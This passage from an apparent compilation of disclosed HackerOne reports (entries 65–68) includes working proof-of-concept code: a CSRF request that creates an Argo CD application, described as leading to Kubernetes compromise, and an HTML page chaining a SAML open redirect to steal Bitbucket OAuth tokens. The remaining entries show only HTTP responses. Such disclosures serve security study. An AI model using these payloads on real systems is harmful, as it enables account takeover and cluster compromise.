	if ( in_array( $_POST['size'], $sizes ) ) {
		$size = esc_attr( $_POST['size'] );
	}

	update_post_meta( $attachment_id, '_wp_attachment_is_custom_background', get_option( 'stylesheet' ) );

	$url       = wp_get_attachment_image_src( $attachment_id, $size );
	$thumbnail = wp_get_attachment_image_src( $attachment_id, 'thumbnail' );
	set_theme_mod( 'background_image', esc_url_raw( $url[0] ) );
	set_theme_mod( 'background_image_thumb', esc_url_raw( $thumbnail[0] ) );
	exit;
}
```

## 65. [#2326194](https://hackerone.com/reports/2326194)  -  Argo CD CSRF leads to Kubernetes cluster compromise
*high, $4,660*

```
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://argocd.internal.victim.com/api/v1/applications');
xhr.setRequestHeader('Content-Type', 'text/plain')
xhr.withCredentials = true;
xhr.send('{"apiVersion":"argoproj.io/v1alpha1","kind":"Application","metadata":{"name":"test-app1"},"spec":{"destination":{"name":"","namespace":"default","server":"https://kubernetes.default.svc"},"source":{"path":"argotest1","repoURL":"https://github.com/califio/argotest1","targetRevision":"HEAD"},"sources":[],"project":"default","syncPolicy":{"automated":{"prune":false,"selfHeal":false}}}}')
```

## 66. [#1923672](https://hackerone.com/reports/1923672)  -  Account takeover due to insufficient URL validation on RelayState parameter
*medium, $2,450*

```
<html>
<title>GitLab</title>


<body>
	
<span>Logout of gitlab if logged in:</span>

<form action="https://gitlab.com/users/sign_out" target="_blank" method="post"><button>Logout Gitlab Account</button></form>

<br>
<br>
<br>
<br>

<span>Open redirect via SAML:</span>

<form action="https://bugcrowd-iambull-2.oktapreview.com/app/bugcrowd-iambull-2_gitlabcom_1/exk1lit3jovMjvewh0h8/sso/saml" target="_blank" method="get">
	<input type="hidden" name="RelayState" value=".witcoat.com" /> 
	<button>Save Open Redirect</button></form>
<br>


<span>steal oauth access Token For Bitbucket:</span>

<form action="https://bitbucket.org/site/oauth2/authorize" target="_blank" method="get">
	<input type="hidden" name="client_id" value="b9jLmh8WCLZPBAwWba" /> 
  <input type="hidden" name="redirect_uri" value="https://gitlab.com/users/auth/bitbucket/callback" /> 
  <input type="hidden" name="response_type" value="token" /> 
    <input type="hidden" name="state" value="Doesnotmatter" /> 


	<button>Steal Bitbucket Code</button>
</form>


</body>



# … truncated …
```

## 67. [#1049360](https://hackerone.com/reports/1049360)  -  CSRF in changing users donation_settings [https://streamlabs.com/api/v6/viewer-portal/viewer-settings/donation_settings]
*medium*

```
HTTP/1.1 200 OK
Date: Thu, 03 Dec 2020 02:48:11 GMT
Content-Type: application/json
Content-Length: 15
Connection: close


{"settings":[]}
```

## 68. [#1637761](https://hackerone.com/reports/1637761)  -  CSRF in Importing CSV files [app.taxjar.com]
*low*

```
HTTP/1.1 303 See Other
x-amz-id-2: MJfWMx2yTnmzg7tbPUlbMLwHCuGJ1bc4MFbj9grzTnwllI0vCEPjDmyWwlpbCTH5RocOPMzjt14=
x-amz-request-id: 4GHN118T2HRAEAQD
Date: Fri, 15 Jul 2022 12:59:06 GMT
ETag: "08ce40c27af955f3cae668e9785abd3e"
Location: https://app.taxjar.com/csv_imports/upload_complete?bucket=taxjar-prod-bucket&key=uploads%2Fe996ac74-689e-4fae-872b-16c537050062%2FCSV_V1_Template.csv&etag=%2208ce40c27af955f3cae668e9785abd3e%22
Server: AmazonS3
Content-Length: 0
Connection: close
```
